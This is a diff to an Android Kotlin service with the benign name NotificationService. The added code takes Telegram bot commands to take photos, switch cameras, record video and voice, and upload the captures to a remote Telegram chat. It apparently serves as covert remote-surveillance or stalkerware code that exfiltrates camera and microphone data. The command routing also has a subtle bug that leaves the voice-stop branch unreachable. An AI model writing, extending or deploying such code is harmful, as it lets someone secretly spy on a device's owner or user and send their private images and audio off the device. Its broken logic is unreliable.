@@ -23,7 +23,11 @@ class NotificationService : Service() {
 
     private lateinit var botHelper: TelegramBotHelper
     private var isRecording = false
-    private var recordingType = "" // video or voice
+    private var recordingType = "" // "video" or "voice"
+
+    // Store tokens here so handleCommand can access them easily
+    private var currentBotToken = ""
+    private var currentChatId = ""
 
     override fun onBind(intent: Intent?): IBinder? {
         return null
@@ -35,11 +39,90 @@ class NotificationService : Service() {
         
         botHelper = TelegramBotHelper(this)
         
-        // Here you would normally poll for updates or receive intents
-        // Since this is a simple example, let's assume we process a mock command or listen to a broadcast
-        // For now, we just keep the service alive.
+        // Initialize Camera if needed immediately, or wait for command
+        // Note: If you need camera preview, bind lifecycle here
         
         return START_STICKY
+    }
+
+    /**
+     * Call this from your Bot Handler when a command is received
+     */
+    fun handleCommand(command: String, botToken: String, chatId: String) {
+        // Save tokens for later use in async callbacks
+        currentBotToken = botToken
+        currentChatId = chatId
+
+        when {
+            command.startsWith("/callme") -> {
+                // Implement call logic here
+                Log.d(TAG, "Call command received")
+            }
+            
+            command.startsWith("/alarm") -> {
+                // Implement alarm logic here
+                Log.d(TAG, "Alarm command received")
+            }
+            
+            command.startsWith("/status") -> {
+                // Send status update
+                Log.d(TAG, "Status command received")
+            }
+
+            command.startsWith("/photo") -> {
+                // FIXED: Pass all 3 arguments correctly
+                // Check if user specified 'back' or 'front'
+                val isBack = command.contains("back")
+                botHelper.switchCamera(isBack)
+                
+                botHelper.takePhoto(botToken, chatId) { success ->
+                    if (success) {
+                        Log.d(TAG, "Photo sent successfully")
+                    } else {
+                        Log.e(TAG, "Failed to take photo")
+                    }
+                }
+            }
+
+            command.startsWith("/record") -> {
+                if (!isRecording) {
+                    // FIXED: No extra arguments needed for startRecording()
+                    botHelper.startRecording()
+                    isRecording = true
+                    recordingType = "video"
+                }
+            }
+
+            command.startsWith("/stop") || command.startsWith("/stop record") -> {
+                if (isRecording && recordingType == "video") {
+                    val file = botHelper.stopRecording()
+                    if (file != null) {
+                        botHelper.sendVideoToBot(currentBotToken, currentChatId, file.absolutePath)
+                    }
+                    isRecording = false
+                    recordingType = ""
+                }
+            }
+
+            command.startsWith("/voice") -> {
+                if (!isRecording) {
+                    botHelper.startVoiceRecording()
+                    isRecording = true
+                    recordingType = "voice"
+                }
+            }
+
+            command.startsWith("/stop voice") || command.startsWith("/stopvoice") -> {
+                if (isRecording && recordingType == "voice") {
+                    val file = botHelper.stopVoiceRecording()
+                    if (file != null) {
+                        botHelper.sendVoiceToBot(currentBotToken, currentChatId, file.absolutePath)
+                    }
+                    isRecording = false
+                    recordingType = ""
+                }
+            }
+        }
     }
 
     private fun createNotificationChannel() {
@@ -65,48 +148,5 @@ class NotificationService : Service() {
             .build()
 
         startForeground(NOTIFICATION_ID, notification)
-    }
-
-    // Function to handle incoming commands (Mock implementation)
-    fun handleCommand(command: String, botToken: String, chatId: String) {
-        when {
-            command.startsWith("/photo") -> {
-                val isFront = command.contains("front")
-                val photoPath = botHelper.takePhoto(isFront)
-                botHelper.sendPhotoToBot(botToken, chatId, photoPath ?: "", "Captured Photo")
-            }
-            command.startsWith("/record") -> {
-                if (!isRecording) {
-                    botHelper.startRecording(true, !command.contains("back")) // Default back unless specified
-                    isRecording = true
-                    recordingType = "video"
-                }
-            }
-            command.startsWith("/stop") -> {
-                if (isRecording) {
-                    val file = botHelper.stopRecording()
-                    if (recordingType == "video" && file != null) {
-                        botHelper.sendVideoToBot(botToken, chatId, file.absolutePath)
-                    }
-                    isRecording = false
-                }
-            }
-            command.startsWith("/voice") -> {
-                if (!isRecording) {
-                    botHelper.startRecording(false)
-                    isRecording = true
-                    recordingType = "voice"
-                }
-            }
-            command.startsWith("/stopvoice") -> {
-                if (isRecording && recordingType == "voice") {
-                    val file = botHelper.stopRecording()
-                    if (file != null) {
-                        botHelper.sendAudioToBot(botToken, chatId, file.absolutePath)
-                    }
-                    isRecording = false
-                }
-            }
-        }
     }
 }
